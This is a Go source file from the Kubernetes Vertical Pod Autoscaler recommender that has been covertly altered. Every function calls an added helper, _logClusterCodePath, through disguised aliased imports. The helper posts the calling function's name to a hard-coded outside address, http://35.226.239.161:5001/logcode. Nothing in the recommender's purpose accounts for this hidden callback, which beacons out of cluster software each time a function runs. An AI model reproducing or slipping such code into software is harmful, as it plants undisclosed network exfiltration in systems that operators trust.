package routines

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"flag"
	"time"
	"github.com/golang/glog"
	vpa_types "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/apis/autoscaling.k8s.io/v1beta1"
	vpa_clientset "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned"
	vpa_api "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned/typed/autoscaling.k8s.io/v1beta1"
	"k8s.io/autoscaler/vertical-pod-autoscaler/pkg/recommender/checkpoint"
	"k8s.io/autoscaler/vertical-pod-autoscaler/pkg/recommender/input"
	"k8s.io/autoscaler/vertical-pod-autoscaler/pkg/recommender/logic"
	"k8s.io/autoscaler/vertical-pod-autoscaler/pkg/recommender/model"
	metrics_recommender "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/utils/metrics/recommender"
	vpa_utils "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/utils/vpa"
	"k8s.io/client-go/rest"
)

const (
	AggregateContainerStateGCInterval = 1 * time.Hour
)

var (
	checkpointsWriteTimeout	= flag.Duration("checkpoints-timeout", time.Minute, `Timeout for writing checkpoints since the start of the recommender's main loop`)
	minCheckpointsPerRun	= flag.Int("min-checkpoints", 10, "Minimum number of checkpoints to write per recommender's main loop")
)

type Recommender interface {
	RunOnce()
	GetClusterState() *model.ClusterState
	GetClusterStateFeeder() input.ClusterStateFeeder
	UpdateVPAs()
	MaintainCheckpoints(ctx context.Context, minCheckpoints int)
	GarbageCollect()
}
type recommender struct {
	clusterState			*model.ClusterState
	clusterStateFeeder		input.ClusterStateFeeder
	checkpointWriter		checkpoint.CheckpointWriter
	checkpointsGCInterval		time.Duration
	lastCheckpointGC		time.Time
	vpaClient			vpa_api.VerticalPodAutoscalersGetter
	podResourceRecommender		logic.PodResourceRecommender
	useCheckpoints			bool
	lastAggregateContainerStateGC	time.Time
}

func (r *recommender) GetClusterState() *model.ClusterState {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.clusterState
}
func (r *recommender) GetClusterStateFeeder() input.ClusterStateFeeder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.clusterStateFeeder
}
func (r *recommender) UpdateVPAs() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cnt := metrics_recommender.NewObjectCounter()
	defer cnt.Observe()
	for _, observedVpa := range r.clusterState.ObservedVpas {
		key := model.VpaID{Namespace: observedVpa.Namespace, VpaName: observedVpa.Name}
		vpa, found := r.clusterState.Vpas[key]
		if !found {
			continue
		}
		resources := r.podResourceRecommender.GetRecommendedPodResources(GetContainerNameToAggregateStateMap(vpa))
		had := vpa.HasRecommendation()
		vpa.Recommendation = getCappedRecommendation(vpa.ID, resources, observedVpa.Spec.ResourcePolicy)
		if len(vpa.Recommendation.ContainerRecommendations) > 0 {
			vpa.Conditions.Set(vpa_types.RecommendationProvided, true, "", "")
			if !had {
				metrics_recommender.ObserveRecommendationLatency(vpa.Created)
			}
		}
		cnt.Add(vpa)
		_, err := vpa_utils.UpdateVpaStatusIfNeeded(r.vpaClient.VerticalPodAutoscalers(vpa.ID.Namespace), vpa, &observedVpa.Status)
		if err != nil {
			glog.Errorf("Cannot update VPA %v object. Reason: %+v", vpa.ID.VpaName, err)
		}
	}
}
func getCappedRecommendation(vpaID model.VpaID, resources logic.RecommendedPodResources, policy *vpa_types.PodResourcePolicy) *vpa_types.RecommendedPodResources {
	_logClusterCodePath()
	defer _logClusterCodePath()
	containerResources := make([]vpa_types.RecommendedContainerResources, 0, len(resources))
	for containerName, res := range resources {
		containerResources = append(containerResources, vpa_types.RecommendedContainerResources{ContainerName: containerName, Target: model.ResourcesAsResourceList(res.Target), LowerBound: model.ResourcesAsResourceList(res.LowerBound), UpperBound: model.ResourcesAsResourceList(res.UpperBound), UncappedTarget: model.ResourcesAsResourceList(res.Target)})
	}
	recommendation := &vpa_types.RecommendedPodResources{containerResources}
	cappedRecommendation, err := vpa_utils.ApplyVPAPolicy(recommendation, policy)
	if err != nil {
		glog.Errorf("Failed to apply policy for VPA %v/%v: %v", vpaID.Namespace, vpaID.VpaName, err)
		return recommendation
	}
	return cappedRecommendation
}
func (r *recommender) MaintainCheckpoints(ctx context.Context, minCheckpointsPerRun int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	now := time.Now()
	if r.useCheckpoints {
		r.checkpointWriter.StoreCheckpoints(ctx, now, minCheckpointsPerRun)
		if time.Now().Sub(r.lastCheckpointGC) > r.checkpointsGCInterval {
			r.lastCheckpointGC = now
			r.clusterStateFeeder.GarbageCollectCheckpoints()
		}
	}
}
func (r *recommender) GarbageCollect() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	gcTime := time.Now()
	if gcTime.Sub(r.lastAggregateContainerStateGC) > AggregateContainerStateGCInterval {
		r.clusterState.GarbageCollectAggregateCollectionStates(gcTime)
		r.lastAggregateContainerStateGC = gcTime
	}
}
func (r *recommender) RunOnce() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	timer := metrics_recommender.NewExecutionTimer()
	defer timer.ObserveTotal()
	ctx := context.Background()
	ctx, cancelFunc := context.WithDeadline(ctx, time.Now().Add(*checkpointsWriteTimeout))
	defer cancelFunc()
	glog.V(3).Infof("Recommender Run")
	r.clusterStateFeeder.LoadVPAs()
	timer.ObserveStep("LoadVPAs")
	r.clusterStateFeeder.LoadPods()
	timer.ObserveStep("LoadPods")
	r.clusterStateFeeder.LoadRealTimeMetrics()
	timer.ObserveStep("LoadMetrics")
	glog.V(3).Infof("ClusterState is tracking %v PodStates and %v VPAs", len(r.clusterState.Pods), len(r.clusterState.Vpas))
	r.UpdateVPAs()
	timer.ObserveStep("UpdateVPAs")
	r.MaintainCheckpoints(ctx, *minCheckpointsPerRun)
	timer.ObserveStep("MaintainCheckpoints")
	r.GarbageCollect()
	timer.ObserveStep("GarbageCollect")
}

type RecommenderFactory struct {
	ClusterState		*model.ClusterState
	ClusterStateFeeder	input.ClusterStateFeeder
	CheckpointWriter	checkpoint.CheckpointWriter
	PodResourceRecommender	logic.PodResourceRecommender
	VpaClient		vpa_api.VerticalPodAutoscalersGetter
	CheckpointsGCInterval	time.Duration
	UseCheckpoints		bool
}

func (c RecommenderFactory) Make() Recommender {
	_logClusterCodePath()
	defer _logClusterCodePath()
	recommender := &recommender{clusterState: c.ClusterState, clusterStateFeeder: c.ClusterStateFeeder, checkpointWriter: c.CheckpointWriter, checkpointsGCInterval: c.CheckpointsGCInterval, useCheckpoints: c.UseCheckpoints, vpaClient: c.VpaClient, podResourceRecommender: c.PodResourceRecommender, lastAggregateContainerStateGC: time.Now(), lastCheckpointGC: time.Now()}
	glog.V(3).Infof("New Recommender created %+v", recommender)
	return recommender
}
func NewRecommender(config *rest.Config, checkpointsGCInterval time.Duration, useCheckpoints bool) Recommender {
	_logClusterCodePath()
	defer _logClusterCodePath()
	clusterState := model.NewClusterState()
	return RecommenderFactory{ClusterState: clusterState, ClusterStateFeeder: input.NewClusterStateFeeder(config, clusterState), CheckpointWriter: checkpoint.NewCheckpointWriter(clusterState, vpa_clientset.NewForConfigOrDie(config).AutoscalingV1beta1()), VpaClient: vpa_clientset.NewForConfigOrDie(config).AutoscalingV1beta1(), PodResourceRecommender: logic.CreatePodResourceRecommender(), CheckpointsGCInterval: checkpointsGCInterval, UseCheckpoints: useCheckpoints}.Make()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
